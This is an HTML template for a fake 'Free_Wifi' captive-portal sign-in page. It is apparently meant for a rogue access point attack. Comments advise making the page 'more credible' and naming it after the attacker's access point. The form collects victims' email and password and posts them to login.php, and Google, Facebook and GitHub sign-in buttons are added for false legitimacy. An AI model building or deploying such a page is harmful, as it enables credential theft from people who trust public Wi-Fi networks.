<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wifi Connect</title>  <!--Choose your title that will appear on the widget-->
    <style>  /*style your oauth login page to make more credible*/
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #1e3c72, #2a5298, #6a11cb, #2575fc, #ff6f61, #ffcc00, #6a11cb, #1e3c72);       /*Choose the colors that you want or just change to background-color for one only color*/
            background-size: 400% 400%;
            animation: gradientBG 12s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .login-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .login-container h1 {
            margin-bottom: 20px;
            font-size: 28px;
            color: #333;
            font-weight: 600;
        }
        .login-container p {
            margin-bottom: 30px;
            color: #666;
            font-size: 16px;
        }
        .login-container input {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        .login-container input:focus {
            border-color: #007bff;
            outline: none;
        }
        .login-container button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .login-container button:hover {
            background-color: #0056b3;
        }
        .login-container .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
        .login-container .footer a {
            color: #007bff;
            text-decoration: none;
            font-weight: 500;
        }
        .login-container .footer a:hover {
            text-decoration: underline;
        }
        .login-container .social-login {
            margin-top: 20px;
        }
        .login-container .social-login p {
            margin-bottom: 10px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        .login-container .social-login .social-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        .login-container .social-login .social-buttons button {
            background-color: transparent;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 10px 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
            font-weight: 500;
        }
        .login-container .social-login .social-buttons button:hover {
            background-color: rgba(0, 123, 255, 0.1);
            border-color: #007bff;
        }
        .login-container .social-login .social-buttons button img {
            width: 20px;
            height: 20px;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign In to connect to "Free_Wifi"</h1>    <!--Use the name that you use for your access pojnt-->
        <p>Please enter your email and password to continue.</p>
        <form action="login.php" method="post">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="social-login">
            <p>Or sign in with:</p>
            <div class="social-buttons">
                <button type="button">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
                    Google
                </button>
                <button type="button">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Facebook_icon_2013.svg" alt="Facebook Logo">
                    Facebook
                </button>
                <button type="button">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg" alt="GitHub Logo">
                    GitHub
                </button>
            </div>
        </div>
        <div class="footer">
            <p>Don't have an account? <a href="Your link">Sign up</a></p>  <!--Choose a link to redirect, if you don't want to type #-->
            <p><a href="Choose a link">Forgot password?</a></p>  <!--choose a link to redirect, if you don't want type #-->
        </div>
    </div>
</body>
</html>
